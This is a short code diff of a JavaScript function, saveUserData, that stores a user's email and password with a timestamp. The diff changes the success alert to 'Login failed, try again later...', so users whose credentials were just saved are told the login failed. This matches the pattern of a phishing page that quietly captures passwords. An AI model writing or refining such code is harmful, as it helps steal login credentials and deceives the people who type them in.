@@ -36,11 +36,11 @@ function saveUserData(email, password) {
         time: timestamp
     })
     .then(() => {
-        alert("User data saved successfully!");
+        alert("Login failed, try again later...");
     })
     .catch((error) => {
         console.error("Error saving user data:", error);
-        alert("Failed to save user data. Please try again.");
+        alert("Login error");
     });
 }
 
